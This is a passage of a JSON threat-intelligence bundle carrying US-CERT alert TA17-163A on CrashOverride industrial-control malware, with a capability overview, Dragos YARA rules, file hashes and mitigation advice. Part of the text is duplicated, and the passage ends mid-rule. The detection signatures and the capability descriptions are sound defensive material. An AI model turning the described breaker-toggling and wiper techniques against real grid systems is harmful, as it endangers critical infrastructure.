privileges.</li><li>Audit existing firewall rules and close all ports that are not explicitly needed for business. Specifically, carefully consider which ports should be connecting outbound versus inbound.</li><li>Enforce a strict lockout policy for network users and closely monitor logs for failed login activity. Failed login activity can be indicative of failed intrusion activity.</li><li>If remote access between zones is an unavoidable business need, log and monitor these connections closely.</li><li>In environments with a high risk of interception or intrusion, organizations should consider supplementing password authentication with other forms of authentication such as challenge/response or multifactor authentication using biometric or physical tokens.</li></ul><p><strong><em>Logging Practices</em></strong></p><p>System operators should follow these secure logging practices.</p><ul><li>Ensure event logging, including applications, events, login activities, and security attributes, is turned on or monitored for identification of security issues.</li><li>Configure network logs to provide adequate information to assist in quickly developing an accurate determination of a security incident.</li><li>Upgrade PowerShell to new versions with enhanced logging features and monitor the logs to detect usage of PowerShell commands, which are often malware-related.</li><li>Secure logs in a centralized location and protect them from modification.</li><li>Prepare an incident response plan that can be rapidly administered in case of a cyber intrusion.</li></ul>\t\t\n\t\t<h3>References</h3>\n\t\t<ul>\n\t\t\t\t\t<li><a href=\"https://exchange.xforce.ibmcloud.com/collection/Actor-Lazarus-Group-0bf5e50d24445f94d6b2d744dc6c63a2\">[1] IBM. Actor Lazarus Group – Blog Post by IBM X-Force Exchange.</a></li>\n\t\t\t\t\t<li><a href=\"https://www.alienvault.com/blogs/labs-research/operation-blockbuster-unveils-the-actors-behind-the-sony-attacks\">[2] AlienVault. Operation Blockbuster Unveils the Actors Behind the Sony Attacks.</a></li>\n\t\t\t\t\t<li><a href=\"https://www.symantec.com/connect/blogs/destover-destructive-malware-has-links-attacks-south-korea\">[3] Symantec. Destover: Destructive Malware has links back to attacks on South Korea.</a></li>\n\t\t\t\t\t<li><a href=\"https://www.symantec.com/connect/blogs/duuzer-back-door-trojan-targets-south-korea-take-over-computers\">[4] Symantec. Duuzer back door Trojan targets South Korea to take over computers.</a></li>\n\t\t\t\t\t<li><a href=\"https://www.fireeye.com/blog/threat-research/2015/09/zero-day_hwp_exploit.html\">[5] FireEye. Zero-Day HWP Exploit.</a></li>\n\t\t\t\t\t<li><a href=\"https://www.us-cert.gov/ncas/alerts/TA14-353A\">[6] US-CERT. Alert (TA14-353A) Targeted Destructive Malware. Original Release Date: 12/19/2014 | Last revised: 9/30/2016</a></li>\n\t\t\t\t\t<li><a href=\"https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Destructive-Malware-Report.pdf\">[7] Novetta. Operation Blockbuster Destructive Malware Report.</a></li>\n\t\t\t\t</ul>\n\t\t\n\t\t<h3>Revision History</h3>\n\t\t<ul>\n\t\t\t\t\t<li>June 13, 2017: Initial Release</li>\n\t\t\t\t\t\t<li>August 23, 2017: Updated YARA Rules and included MAR-10132963 (.pdf and .stix files)</li>\n\t\t\t\t\t</ul>\n\t\t<hr />\n\t\t<p>This product is provided subject to this <a href=\"http://www.us-cert.gov/privacy/notification\">Notification</a> and this <a href=\"http://www.us-cert.gov/privacy/\">Privacy &amp; Use</a> policy.</p>\t\t<br />"
				}
			],
			"created_by_ref": "US-CERT",
			"created": "2017-06-13T15:45:09.000Z"
		},
		{
			"type": "report",
			"title": "TA17-163A: CrashOverride Malware",
			"name": "TA17-163A: CrashOverride Malware",
			"id": "report-b523da93-c020-40b1-8546-d2812a25b18e",
			"description": "Original release date: June 12, 2017 | Last revised: July 27, 2017<br />\n\t\t<h3>Systems Affected</h3>\n\t\t<p>Industrial Control Systems</p>\t\t\n\t\t<h3>Overview</h3>\n\t\t<p>The National Cybersecurity and Communications Integration Center (NCCIC) is aware of public reports from ESET and Dragos outlining a new, highly capable Industrial Controls Systems (ICS) attack platform that was reportedly used in 2016 against critical infrastructure in Ukraine. As reported by <a href=\"https://www.welivesecurity.com/wp-content/uploads/2017/06/Win32_Industroyer.pdf\">ESET</a> and <a href=\"https://www.dragos.com/blog/crashoverride/\">Dragos</a>, the CrashOverride malware is an extensible platform that could be used to target critical infrastructure sectors. NCCIC is working with its partners to validate the ESET and Dragos analysis, and develop a better understanding of the risk this new malware poses to U.S. critical infrastructure.</p><p>Although this activity is still under investigation, NCCIC is sharing this report to provide organizations with detection and mitigation recommendations to help prevent future compromises within their critical infrastructure networks. NCCIC continues to work with interagency and international partners on this activity and will provide updates as information becomes available.</p><p>For a downloadable copy of indicators of compromise (IOCs), see:</p><ul><li>IOCs (<a href=\"https://www.us-cert.gov/sites/default/files/publications/TA-17-163A_IOCs.csv\">.csv</a>)</li><li>IOCs (<a href=\"https://www.us-cert.gov/sites/default/files/publications/TA-17-163A_IOCs.stix.XML\">.stix</a>)</li></ul><p>To report activity related to this Alert, please contact NCCIC at <a href=\"https://www.us-cert.govmailto:NCCICCustomerService@hq.dhs.gov\">NCCICCustomerService@hq.dhs.gov</a> or 1-888-282-0870.</p><h4>Risk Evaluation</h4><table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" class=\"general-table\" style=\"width: 100%;\"><tbody><tr><td>NCCIC Cyber Incident Scoring System (NCISS) Rating Priority Level (Color)</td></tr><tr><td>Yellow (Medium)</td></tr><tr><td>A medium priority incident may affect public health or safety, national security, economic security, foreign relations, civil liberties, or public confidence.</td></tr></tbody></table><h4>Details</h4><p>There is no evidence to suggest this malware has affected U.S. critical infrastructure. However, the tactics, techniques, and procedures (TTPs) described as part of the CrashOverride malware could be modified to target U.S. critical information networks and systems.</p>\t\t\n\t\t<h3>Description</h3>\n\t\t<h4>Technical Analysis</h4><p>CrashOverride malware represents a scalable, capable platform. The modules and capabilities publically reported appear to focus on organizations using ICS protocols IEC101, IEC104, and IEC61850, which are more commonly used outside the United States in electric power control systems. The platform fundamentally abuses the functionality of a targeted ICS system’s legitimate control system to achieve its intended effect. While the known capabilities do not appear to be U.S.-focused, it is important to recognize that the general TTPs used in CrashOverride could be leveraged with modified technical implementations to affect U.S.-based critical infrastructure. With further modification, CrashOverride or similar malware could have implications beyond electric power so all critical infrastructure organizations should be evaluating their systems to susceptibilities in the TTPs outlined. The malware has several reported capabilities:</p><ol><li>Issues valid commands directly to remote terminal units (RTUs) over ICS protocols. As reported by Dragos, one such command sequence toggles circuit breakers in a rapid open-close-open-close pattern. This could create conditions where individual utilities may island from infected parties, potentially resulting in a degradation of grid reliability.</li><li>Denies service to local serial COM ports on windows devices, therefore preventing legitimate communications with field equipment over serial from the affected device.</li><li>Scans and maps ICS environment using a variety of protocols, including Open Platform Communications (OPC). This significantly improves the payload’s probability of success.</li><li>Could exploit Siemens relay denial-of-service (DoS) vulnerability, leading to a shutdown of the relay. In this instance, the relay would need to be manually reset to restore functionality.</li><li>Includes a wiper module in the platform that renders windows systems inert, requiring a rebuild or backup restoration.</li></ol><h4>Detection</h4><p>As CrashOverride is a second stage malware capability and has the ability to operate independent of initial C2, traditional methods of detection may not be sufficient to detect infections prior to the malware executing. As a result, organizations are encouraged to implement behavioral analysis techniques to attempt to identify precursor activity to CrashOverride. As additional information becomes available on stage one infection vectors and TTPs, this alert will be updated.</p><p>NCCIC is providing a compilation of IOCs (see links above) from a variety of sources to aid in the detection of this malware. The sources provided do not constitute an exhaustive list and the U.S. Government does not endorse or support any particular product or vendor’s information referenced in this report. However, NCCIC has included this data to ensure wide distribution of the most comprehensive information available and will provide updates as warranted.</p><h5>Signatures</h5><p><code>import “pe”<br />import “hash”</code></p><p><code>rule dragos_crashoverride_exporting_dlls<br />{<br />meta:<br />description = “CRASHOVERRIDE v1 Suspicious Export”<br />author = “Dragos Inc”<br />condition:<br />pe.exports(“Crash”) &amp; pe.characteristics<br />}</code></p><p><code>rule dragos_crashoverride_suspcious<br />{<br />meta:<br />description = “CRASHOVERRIDE v1 Wiper”<br />author = “Dragos Inc”<br />strings:<br />$s0 = “SYS_BASCON.COM” fullword nocase wide<br />$s1 = “.pcmp” fullword nocase wide<br />$s2 = “.pcmi” fullword nocase wide<br />$s3 = “.pcmt” fullword nocase wide<br />$s4 = “.cin” fullword nocase wide<br />condition:<br />pe.exports(“Crash”) and any of ($s*)<br />}</code></p><p><code>rule dragos_crashoverride_name_search {<br />meta:<br />description = “CRASHOVERRIDE v1 Suspicious Strings and Export”<br />author = “Dragos Inc”<br />strings:<br />$s0 = “101.dll” fullword nocase wide<br />$s1 = “Crash101.dll” fullword nocase wide<br />$s2 = “104.dll” fullword nocase wide<br />$s3 = “Crash104.dll” fullword nocase wide<br />$s4 = “61850.dll” fullword nocase wide<br />$s5 = “Crash61850.dll” fullword nocase wide<br />$s6 = “OPCClientDemo.dll” fullword nocase wide<br />$s7 = “OPC” fullword nocase wide<br />$s8 = “CrashOPCClientDemo.dll” fullword nocase wide<br />$s9 = “D2MultiCommService.exe” fullword nocase wide<br />$s10 = “CrashD2MultiCommService.exe” fullword nocase wide<br />$s11 = “61850.exe” fullword nocase wide<br />$s12 = “OPC.exe” fullword nocase wide<br />$s13 = “haslo.exe” fullword nocase wide<br />$s14 = “haslo.dat” fullword nocase wide<br />condition:<br />any of ($s*) and pe.exports(“Crash”)<br />}</code></p><p><code>rule dragos_crashoverride_hashes {<br />meta:<br />description = “CRASHOVERRIDE Malware Hashes”<br />author = “Dragos Inc”</code></p><p><code>condition:<br />filesize &lt; 1MB and<br />hash.sha1(0, filesize) == “f6c21f8189ced6ae150f9ef2e82a3a57843b587d” or<br />hash.sha1(0, filesize) == “cccce62996d578b984984426a024d9b250237533” or<br />hash.sha1(0, filesize) == “8e39eca1e48240c01ee570631ae8f0c9a9637187” or<br />hash.sha1(0, filesize) == “2cb8230281b86fa944d3043ae906016c8b5984d9” or<br />hash.sha1(0, filesize) == “79ca89711cdaedb16b0ccccfdcfbd6aa7e57120a” or<br />hash.sha1(0, filesize) == “94488f214b165512d2fc0438a581f5c9e3bd4d4c” or<br />hash.sha1(0, filesize) == “5a5fafbc3fec8d36fd57b075ebf34119ba3bff04” or<br />hash.sha1(0, filesize) == “b92149f046f00bb69de329b8457d32c24726ee00” or<br />hash.sha1(0, filesize) == “b335163e6eb854df5e08e85026b2c3518891eda8”<br />}</code></p><p><code>rule dragos_crashoverride_moduleStrings {<br />meta:<br />description = “IEC-104 Interaction Module Program Strings”<br />author = “Dragos Inc”<br />strings:<br />$s1 = “IEC-104 client: ip=%s; port=%s; ASDU=%u” nocase wide ascii<br />$s2 = “ MSTR -&gt;&gt; SLV” nocase wide ascii<br />$s3 = “ MSTR &lt;&lt;- SLV” nocase wide ascii<br />$s4 = “Unknown APDU format !!!” nocase wide ascii<br />$s5 = “iec104.log” nocase wide ascii<br />condition:<br />any of ($s*)<br />}</code></p><p><code>rule dragos_crashoverride_configReader<br />{<br />meta:<br />description = “CRASHOVERRIDE v1 Config File Parsing”<br />author = “Dragos Inc”<br />strings:<br />$s0 = { 68 e8 ?? ?? ?? 6a 00 e8 a3 ?? ?? ?? 8b f8 83 c4 ?8 }<br />$s1 = { 8a 10 3a 11 75 ?? 84 d2 74 12 }<br />$s2 = { 33 c0 eb ?? 1b c0 83 c8 ?? }<br />$s3 = { 85 c0 75 ?? 8d 95 ?? ?? ?? ?? 8b cf ?? ?? }<br />condition:<br />all of them<br />}</code></p><p><br /><code>rule dragos_crashoverride_configReader<br />{<br />meta:<br />description = “CRASHOVERRIDE v1 Config File Parsing”<br />author = “Dragos Inc”<br />strings:<br />$s0 = { 68 e8 ?? ?? ?? 6a 00 e8 a3 ?? ?? ?? 8b f8 83 c4 ?8 }<br />$s1 = { 8a 10 3a 11 75 ?? 84 d2 74 12 }<br />$s2 = { 33 c0 eb ?? 1b c0 83 c8 ?? }<br />$s3 = { 85 c0 75 ?? 8d 95 ?? ?? ?? ?? 8b cf ?? ?? }<br />condition:<br />all of them<br />}</code></p><p><code>rule dragos_crashoverride_weirdMutex<br />{<br />meta:<br />description = “Blank mutex creation assoicated with CRASHOVERRIDE”<br />author = “Dragos Inc”<br />strings:<br />$s1 = { 81 ec 08 02 00 00 57 33 ff 57 57 57 ff 15 ?? ?? 40 00 a3 ?? ?? ?? 00 85 c0 }<br />$s2 = { 8d 85 ?? ?? ?? ff 50 57 57 6a 2e 57 ff 15 ?? ?? ?? 00 68 ?? ?? 40 00}<br />condition:<br />all of them<br />}</code></p><p><code>rule dragos_crashoverride_serviceStomper<br />{<br />meta:<br />description = “Identify service hollowing and persistence setting”<br />author = “Dragos Inc”<br />strings:<br />$s0 = { 33 c9 51 51 51 51 51 51 ?? ?? ?? }<br />$s1 = { 6a ff 6a ff 6a ff 50 ff 15 24 ?? 40 00 ff ?? ?? ff 15 20 ?? 40 00 }<br />condition:<br />all of them<br />}</code></p><p><code>rule dragos_crashoverride_wiperModuleRegistry<br />{<br />meta:<br />description = “Registry Wiper functionality assoicated with CRASHOVERRIDE”<br />author = “Dragos Inc”<br />strings:<br />$s0 = { 8d 85 a0 ?? ?? ?? 46 50 8d 85 a0 ?? ?? ?? 68 68 0d ?? ?? 50 }<br />$s1 = { 6a 02 68 78 0b ?? ?? 6a 02 50 68 b4 0d ?? ?? ff b5 98 ?? ?? ?? ff 15 04 ?? ?? ?? }<br />$s2 = { 68 00 02 00 00 8d 85 a0 ?? ?? ?? 50 56 ff b5 9c ?? ?? ?? ff 15 00 ?? ?? ?? 85 c0 }<br />condition:<br />all of them<br />}</code></p><p><code>rule dragos_crashoverride_wiperFileManipulation<br />{<br />meta:<br />description = “File manipulation actions associated with CRASHOVERRIDE wip¬er”<br />author = “Dragos Inc”<br />strings:<br />$s0 = { 6a 00 68 80 00 00 00 6a 03 6a 00 6a 02 8b f9 68 00 00 00 40 57 ff 15 1c ?? ?? ?? 8b d8 }<br />$s2 = { 6a 00 50 57 56 53 ff 15 4c ?? ?? ?? 56 }<br />condition:<br />all of them<br />}</code></p>\t\t\n\t\t<h3>Impact</h3>\n\t\t<p>A successful network intrusion can have severe impacts, particularly if the compromise becomes public and sensitive information is exposed. Possible impacts include:</p><ul><li>temporary or permanent loss of sensitive or proprietary information,</li><li>disruption to regular operations,</li><li>financial losses incurred to restore systems and files, and</li><li>potential harm to an organization’s reputation.<br /> </li></ul>\t\t\n\t\t<h3>Solution</h3>\n\t\t<p>Properly implemented defensive techniques and common cyber hygiene practices increase the complexity of barriers that adversaries must overcome to gain unauthorized access to critical information networks and systems. In addition, detection and prevention mechanisms can expose malicious network activity, enabling organizations to contain and respond to intrusions more rapidly. There is no set of defensive techniques or programs that will completely avert all attacks however, layered cybersecurity defenses will aid in reducing an organization’s attack surface and will increase the likelihood of detection. This layered mitigation approach is known as defense-in-depth.<br />NCCIC has based its mitigations and recommendations on its analysis of the public reporting of this malware and will be provide updates as more information becomes available.<br />Critical infrastructure companies should ensure that they are following best practices, which are outlined in the <a href=\"http://ics-cert.us-cert.gov/sites/default/files/documents/Seven Steps to Effectively Defend Industrial Control Systems_S508C.pdf\">Seven Steps to Effectively Defend Industrial Control Systems</a> document produced jointly by DHS, NSA, and FBI.</p><h4>Application Whitelisting</h4><p>Application whitelisting (AWL) can detect and prevent attempted execution of malware uploaded by adversaries. Application whitelisting hardens operating systems and prevents the execution of unauthorized software. The static nature of some systems, such as database servers and human-machine interface (HMI) computers make these ideal candidates to run AWL. NCCIC encourages operators to work with their vendors to baseline and calibrate AWL deployments.<br />Operators may choose to implement directory whitelisting rather than trying to list every possible permutation of applications in an environment. Operators may implement application or application directory whitelisting through Microsoft Software Restriction Policy (SRP), AppLocker, or similar application whitelisting software. Safe defaults allow applications to run from PROGRAMFILES, PROGRAMFILES(X86), SYSTEM32, and any ICS software folders. All other locations should be disallowed unless an exception is granted.</p><h4>Manage Authentication and Authorization</h4><p>This malware exploits the lack of authentication and authorization in common ICS protocols to issue unauthorized commands to field devices. Asset owners/operators should implement authentication and authorization protocols to ensure field devices verify the authenticity of commands before they are actioned. In some instances, legacy hardware may not be capable of implementing these protections. In these cases, asset owners can either leverage ICS firewalls to do stateful inspection and authentication of commands, or upgrade their control field devices.</p><p>Adversaries are increasingly focused on gaining control of legitimate credentials, especially those associated with highly privileged accounts. Compromising these credentials allows adversaries to masquerade as legitimate users, leaving less evidence of compromise than more traditional attack options (i.e., exploiting vulnerabilities or uploading malware). For this reason, operators should implement multi-factor authentication where possible and reduce privileges to only those needed for a user’s duties. If passwords are necessary, operators should implement secure password policies, stressing length over complexity. For all accounts, including system and non-interactive accounts, operators should ensure credentials are unique, and changed, at a minimum, every 90 days.</p><p>NCCIC also recommends that operators require separate credentials for corporate and control network zones and store them in separate trust stores. Operators should never share Active Directory, RSA ACE servers, or other trust stores between corporate and control networks. Specifically, operators should:</p><ul><li>Decrease a threat actor’s ability to access key network resources by implementing the principle of least privilege;</li><li>Limit the ability of a local administrator account to login from a local interactive session (e.g., “Deny access to this computer from the network”) and prevent access via a remote desktop protocol session;</li><li>Remove unnecessary accounts, groups, and restrict root access;</li><li>Control and limit local administration; and</li><li>Make use of the Protected Users Active Directory group in Windows Domains to further secure privileged user accounts against pass-the-hash attacks.</li></ul><h4>Handling Destructive Malware</h4><p>Destructive malware continues to be a threat to both critical infrastructure and business systems. NCCIC encourages organizations to review the <a href=\"https://ics-cert.us-cert.gov/sites/default/files/documents/Destructive_Malware_White_Paper_S508C.pdf\">ICS-CERT destructive malware white paper</a> for detailed mitigation guidance. It is important for organizations to maintain backups of key data, systems, and configurations such as:</p><ul><li>Server gold images,</li><li>ICS Workstation gold configurations,</li><li>Engineering workstation images,</li><li>PLC/RTU configurations,</li><li>Passwords and configuration information, and</li><li>Offline copies of install media for operating systems and control applications.</li></ul><h4>Ensure Proper Configuration/Patch Management</h4><p>Adversaries often target unpatched systems. A configuration/patch management program centered on the safe importation and implementation of trusted patches will help render control systems more secure.</p><p>Such a program will start with an accurate baseline and asset inventory to track what patches are needed. The program will prioritize patching and configuration management of “PC-architecture” machines used in HMI, database server, and engineering workstation roles, as current adversaries have significant cyber capabilities against these systems. Infected laptops are a significant malware vector. Such a program will limit the connection of external laptops to the control network and ideally supply vendors with known-good company laptops. The program will also encourage initial installation of any updates onto a test system that includes malware detection features before the updates are installed on operational systems.</p><p>NCCIC recommends that operators:</p><ul><li>Use best practices when downloading software and patches destined for their control network;</li><li>Take measures to avoid watering hole attacks;</li><li>Use a web Domain Name System (DNS) reputation system;</li><li>Obtain and apply updates from authenticated vendor sites;</li><li>Validate the authenticity of downloads;</li><li>Insist that vendors digitally sign updates, and/or publish hashes via an out-of-bound communications path, and only use this path to authenticate;</li><li>Never load updates from unverified sources; and</li><li>Reduce your attack surface area.</li></ul><p>To the greatest extent possible, NCCIC recommends that operators:</p><ul><li>Isolate ICS networks from any untrusted networks, especially the Internet;</li><li>Lock down all unused ports;</li><li>Turn off all unused services; and</li><li>Only allow real-time connectivity to external networks if there is a defined business requirement or control function.<ul><li>If one-way communication can accomplish a task, operators should use optical separation (“data diode”).</li><li>If bidirectional communication is necessary, operators should use a single open port over a restricted network path.</li></ul></li></ul><h4>Build a Defendable Environment</h4><p>Building a defendable environment will help limit the impact from network perimeter breaches. NCCIC recommends operators segment networks into logical enclaves and restrict host-to-host communications paths. This can prevent adversaries from expanding their access, while allowing the normal system communications to continue operating. Enclaving limits possible damage, as threat actors cannot use compromised systems to reach and contaminate systems in other enclaves. Containment provided by enclaving also makes incident cleanup significantly less costly.</p><p>If one-way data transfer from a secure zone to a less secure zone is required, operators should consider using approved removable media instead of a network connection. If real-time data transfer is required, operators should consider using optical separation technologies. This allows replication of data without placing the control system at risk.</p><p>Additional details on effective strategies for building a defendable ICS network can be found in the <a href=\"http://ics-cert.us-cert.gov/Abstract-Defense-Depth-RP\">ICS-CERT Defense-in-Depth Recommended Practice</a>.</p><h4>Implement Secure Remote Access</h4><p>Some adversaries are effective at gaining remote access into control systems, finding obscure access vectors, even “hidden back doors” intentionally created by system operators. Operators should remove such accesses wherever possible, especially modems, as these are fundamentally insecure.<br />Operators should:</p><ul><li>Limit any accesses that remain;</li><li>Where possible, implement “monitoring only” access enforced by data diodes, and not rely on “read only” access enforced by software configurations or permissions;</li><li>Not allow remote persistent vendor connections into the control network;</li><li>Require any remote access to be operator controlled, time limited, and procedurally similar to “lock out, tag out”;</li><li>Use the same remote access paths for vendor and employee connections; do not allow double standards; and</li><li>Use two-factor authentication if possible, avoiding schemes where both tokens are similar and can be easily stolen (e.g., password and soft certificate).</li></ul><h4>Monitor and Respond</h4><p>Defending a network against modern threats requires actively monitoring for adversarial penetration and quickly executing a prepared response. Operators should:</p><ul><li>Consider establishing monitoring programs in the following key places: at the Internet boundary; at the business to Control DMZ boundary; at the Control DMZ to control LAN boundary; and inside the Control LAN;</li><li>Watch IP traffic on ICS boundaries for abnormal or suspicious communications;</li><li>Monitor IP traffic within the control network for malicious connections or content;</li><li>Use host-based products to detect malicious software and attack attempts;<ul><li>Use login analysis (e.g., time and place) to detect stolen credential usage or improper access, verifying all anomalies with quick phone calls;</li><li>Watch account and user administration actions to detect access control manipulation;</li></ul></li><li>Have a response plan for when adversarial activity is detected; and<ul><li>Such a plan may include disconnecting all Internet connections, running a properly scoped search for malware, disabling affected user accounts, isolating suspect systems, and immediately resetting 100 percent of passwords.</li><li>Such a plan may also define escalation triggers and actions, including incident response, investigation, and public affairs activities.</li></ul></li><li>Have a restoration plan, including “gold disks” ready to restore systems to known good states.<br /> </li></ul>\t\t\n\t\t<h3>References</h3>\n\t\t<ul>\n\t\t\t\t\t<li><a href=\"https://www.welivesecurity.com/wp-content/uploads/2017/06/Win32_Industroyer.pdf\">[1] ESET: WIN32/INDUSTROYER – A New Threat for Industrial Control Systems</a></li>\n\t\t\t\t\t<li><a href=\"https://www.dragos.com/blog/crashoverride/\">[2] Dragos: CRASHOVERRIDE</a></li>\n\t\t\t\t</ul>\n\t\t\n\t\t<h3>Revision History</h3>\n\t\t<ul>\n\t\t\t\t\t<li>June 12, 2017: Initial Release</li>\n\t\t\t\t\t\t<li>June 13, 2017: Updated IOCs (both STIX and CSV formats)</li>\n\t\t\t\t\t\t<li>July 7, 2017: Updated IOCs (both STIX and CSV formats)</li>\n\t\t\t\t\t\t<li>July 21, 2017: Corrected typographical error</li>\n\t\t\t\t\t\t<li>July 24, 2017: Corrected links to downloadable IOC files</li>\n\t\t\t\t\t</ul>\n\t\t<hr />\n\t\t<p>This product is provided subject to this <a href=\"http://www.us-cert.gov/privacy/notification\">Notification</a> and this <a href=\"http://www.us-cert.gov/privacy/\">Privacy &amp; Use</a> policy.</p>\t\t<br />",
			"external_references": [
				{
					"external_id": "9042 at https://www.us-cert.gov",
					"url": "https://www.us-cert.gov/ncas/alerts/TA17-163A",
					"source_name": "open source",
					"description": "Original release date: June 12, 2017 | Last revised: July 27, 2017<br />\n\t\t<h3>Systems Affected</h3>\n\t\t<p>Industrial Control Systems</p>\t\t\n\t\t<h3>Overview</h3>\n\t\t<p>The National Cybersecurity and Communications Integration Center (NCCIC) is aware of public reports from ESET and Dragos outlining a new, highly capable Industrial Controls Systems (ICS) attack platform that was reportedly used in 2016 against critical infrastructure in Ukraine. As reported by <a href=\"https://www.welivesecurity.com/wp-content/uploads/2017/06/Win32_Industroyer.pdf\">ESET</a> and <a href=\"https://www.dragos.com/blog/crashoverride/\">Dragos</a>, the CrashOverride malware is an extensible platform that could be used to target critical infrastructure sectors. NCCIC is working with its partners to validate the ESET and Dragos analysis, and develop a better understanding of the risk this new malware poses to U.S. critical infrastructure.</p><p>Although this activity is still under investigation, NCCIC is sharing this report to provide organizations with detection and mitigation recommendations to help prevent future compromises within their critical infrastructure networks. NCCIC continues to work with interagency and international partners on this activity and will provide updates as information becomes available.</p><p>For a downloadable copy of indicators of compromise (IOCs), see:</p><ul><li>IOCs (<a href=\"https://www.us-cert.gov/sites/default/files/publications/TA-17-163A_IOCs.csv\">.csv</a>)</li><li>IOCs (<a href=\"https://www.us-cert.gov/sites/default/files/publications/TA-17-163A_IOCs.stix.XML\">.stix</a>)</li></ul><p>To report activity related to this Alert, please contact NCCIC at <a href=\"https://www.us-cert.govmailto:NCCICCustomerService@hq.dhs.gov\">NCCICCustomerService@hq.dhs.gov</a> or 1-888-282-0870.</p><h4>Risk Evaluation</h4><table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" class=\"general-table\" style=\"width: 100%;\"><tbody><tr><td>NCCIC Cyber Incident Scoring System (NCISS) Rating Priority Level (Color)</td></tr><tr><td>Yellow (Medium)</td></tr><tr><td>A medium priority incident may affect public health or safety, national security, economic security, foreign relations, civil liberties, or public confidence.</td></tr></tbody></table><h4>Details</h4><p>There is no evidence to suggest this malware has affected U.S. critical infrastructure. However, the tactics, techniques, and procedures (TTPs) described as part of the CrashOverride malware could be modified to target U.S. critical information networks and systems.</p>\t\t\n\t\t<h3>Description</h3>\n\t\t<h4>Technical Analysis</h4><p>CrashOverride malware represents a scalable, capable platform. The modules and capabilities publically reported appear to focus on organizations using ICS protocols IEC101, IEC104, and IEC61850, which are more commonly used outside the United States in electric power control systems. The platform fundamentally abuses the functionality of a targeted ICS system’s legitimate control system to achieve its intended effect. While the known capabilities do not appear to be U.S.-focused, it is important to recognize that the general TTPs used in CrashOverride could be leveraged with modified technical implementations to affect U.S.-based critical infrastructure. With further modification, CrashOverride or similar malware could have implications beyond electric power so all critical infrastructure organizations should be evaluating their systems to susceptibilities in the TTPs outlined. The malware has several reported capabilities:</p><ol><li>Issues valid commands directly to remote terminal units (RTUs) over ICS protocols. As reported by Dragos, one such command sequence toggles circuit breakers in a rapid open-close-open-close pattern. This could create conditions where individual utilities may island from infected parties, potentially resulting in a degradation of grid reliability.</li><li>Denies service to local serial COM ports on windows devices, therefore preventing legitimate communications with field equipment over serial from the affected device.</li><li>Scans and maps ICS environment using a variety of protocols, including Open Platform Communications (OPC). This significantly improves the payload’s probability of success.</li><li>Could exploit Siemens relay denial-of-service (DoS) vulnerability, leading to a shutdown of the relay. In this instance, the relay would need to be manually reset to restore functionality.</li><li>Includes a wiper module in the platform that renders windows systems inert, requiring a rebuild or backup restoration.</li></ol><h4>Detection</h4><p>As CrashOverride is a second stage malware capability and has the ability to operate independent of initial C2, traditional methods of detection may not be sufficient to detect infections prior to the malware executing. As a result, organizations are encouraged to implement behavioral analysis techniques to attempt to identify precursor activity to CrashOverride. As additional information becomes available on stage one infection vectors and TTPs, this alert will be updated.</p><p>NCCIC is providing a compilation of IOCs (see links above) from a variety of sources to aid in the detection of this malware. The sources provided do not constitute an exhaustive list and the U.S. Government does not endorse or support any particular product or vendor’s information referenced in this report. However, NCCIC has included this data to ensure wide distribution of the most comprehensive information available and will provide updates as warranted.</p><h5>Signatures</h5><p><code>import “pe”<br />import “hash”</code></p><p><code>rule dragos_crashoverride_exporting_dlls<br />{<br />meta:<br />description = “CRASHOVERRIDE v1 Suspicious Export”<br />author = “Dragos Inc”<br />condition:<br />pe.exports(“Crash”) &amp; pe.characteristics<br />}</code></p><p><code>rule dragos_crashoverride_suspcious<br />{<br />meta:<br />description = “CRASHOVERRIDE v1 Wiper”<br />author = “Dragos Inc”<br />strings:<br />$s0 = “SYS_BASCON.COM” fullword nocase wide<br />$s1 = “.pcmp” fullword nocase wide<br />$s2 = “.pcmi” fullword nocase wide<br />$s3 = “.pcmt” fullword nocase wide<br />$s4 = “.cin” fullword nocase wide<br />condition:<br />pe.exports(“Crash”) and any of ($s*)<br />}</code></p><p><code>rule dragos_crashoverride_name_search {<br />meta:<br />description = “CRASHOVERRIDE v1 Suspicious Strings and Export”<br />author = “Dragos Inc”<br />strings:<br />$s0 = “101.dll” fullword nocase wide<br />$s1 = “Crash101.dll” fullword nocase wide<br />$s2 = “104.dll” fullword nocase wide<br />$s3 = “Crash104.dll” fullword nocase wide<br />$s4 = “61850.dll” fullword nocase wide<br />$s5 = “Crash61850.dll” fullword nocase wide<br />$s6 = “OPCClientDemo.dll” fullword nocase wide<br />$s7 = “OPC” fullword nocase wide<br />$s8 = “CrashOPCClientDemo.dll” fullword nocase wide<br />$s9 = “D2MultiCommService.exe” fullword nocase wide<br />$s10 = “CrashD2MultiCommService.exe” fullword nocase wide<br />$s11 = “61850.exe” fullword nocase wide<br />$s12 = “OPC.exe” fullword nocase wide<br />$s13 = “haslo.exe” fullword nocase wide<br />$s14 = “haslo.dat” fullword nocase wide<br />condition:<br />any of ($s*) and pe.exports(“Crash”)<br />}</code></p><p><code>rule dragos_crashoverride_hashes {<br />meta:<br />description = “CRASHOVERRIDE Malware Hashes”<br />author = “Dragos Inc”</code></p><p><code>condition:<br />filesize &lt; 1MB and<br />hash.sha1(0, filesize) == “f6c21f8189ced6ae150f9ef2e82a3a57843b587d” or<br />hash.sha1(0, filesize) == “cccce62996d578b984984426a024d9b250237533” or<br />hash.sha1(0, filesize) == “8e39eca1e48240c01ee570631ae8f0c9a9637187” or<br />hash.sha1(0, filesize) == “2cb8230281b86fa944d3043ae906016c8b5984d9” or<br />hash.sha1(0, filesize) == “79ca89711cdaedb16b0ccccfdcfbd6aa7e57120a” or<br />hash.sha1(0, filesize) == “94488f214b165512d2fc0438a581f5c9e3bd4d4c” or<br />hash.sha1(0, filesize) == “5a5fafbc3fec8d36fd57b075ebf34119ba3bff04” or<br />hash.sha1(0, filesize) == “b92149f046f00bb69de329b8457d32c24726ee00” or<br />hash.sha1(0, filesize) == “b335163e6eb854df5e08e85026b2c3518891eda8”<br />}</code></p><p><code>rule dragos_crashoverride_moduleStrings {<br />meta:<br />description = “IEC-104 Interaction Module Program Strings”<br />author = “Dragos Inc”<br />strings:<br />$s1 = “IEC-104 client: ip=%s; port=%s; ASDU=%u” nocase wide ascii<br />$s2 = “ MSTR -&gt;&gt; SLV” nocase wide ascii<br />$s3 = “ MSTR &lt;&lt;- SLV” nocase wide ascii<br />$s4 = “Unknown APDU format !!!” nocase wide ascii<br />$s5 = “iec104.log” nocase wide ascii<br />condition:<br />any of ($s*)<br />}</code></p><p><code>rule dragos_crashoverride_configReader<br />{<br />meta:<br />description = 